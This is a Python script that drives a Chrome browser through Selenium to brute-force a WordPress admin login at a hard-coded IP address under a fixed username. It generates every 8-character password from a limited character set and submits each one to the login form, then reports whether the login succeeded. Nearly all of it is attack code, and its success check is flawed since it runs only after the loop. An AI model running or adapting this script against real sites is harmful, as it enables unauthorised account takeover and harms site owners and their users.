# Lets you attempt a wordpress admin panel login automatically

from selenium import webdriver
import time
class Login:

    URL = 'http://10.225.147.156/wp-login.php'
    passwordDictionary = []
    generatedDict = []
    wordlist = open("Wordlists/EncodedWordlist.txt")
    charList = "abcdehilmnopqrstuky"
    username = "sigurda"
    password = "test"
    websiteDriver = None
    service = None

    def __init__(self):
        self.websiteDriver = webdriver.Chrome()
        self.fileToArrayConverter()
        self.generatePasswords()

    def fileToArrayConverter(self):
        for word in self.wordlist:
            wordconv1 = word.split(" ")
            for newWord in wordconv1:
                self.passwordDictionary.append(newWord)

    def generatePasswords(self):
        for current in range(8):
            self.generatedDict = [i for i in self.charList]
            for y in range(current):
                self.generatedDict = [current + i for i in self.charList for current in self.generatedDict]

    def bruteForcer(self):
        self.websiteDriver.get(self.URL)

        for password in self.generatedDict:
            if len(password) > 7:

                time.sleep(0.2)
                # Clears the username field so that it does not appear double (happens when the wordpress password is wrong)
                self.websiteDriver.find_element_by_id("user_login").clear()
                username_input = self.websiteDriver.find_element_by_id("user_login")
                username_input.send_keys(self.username)

                password_input = self.websiteDriver.find_element_by_id("user_pass")
                password_input.send_keys(password)

                login_attempt = self.websiteDriver.find_element_by_xpath("//*[@type='submit']")
                login_attempt.submit()
                self.password = password
        if self.websiteDriver.find_element_by_id("wp-submit"):
            print("The login was unsuccessful with password " + self.password + " and the username " + self.username)
        else:
            print("The login was successfull! the password for user: " + self.username + " is: " + self.password)
        self.websiteDriver.save_screenshot('screen.png')
        self.websiteDriver.quit()


Login().bruteForcer()




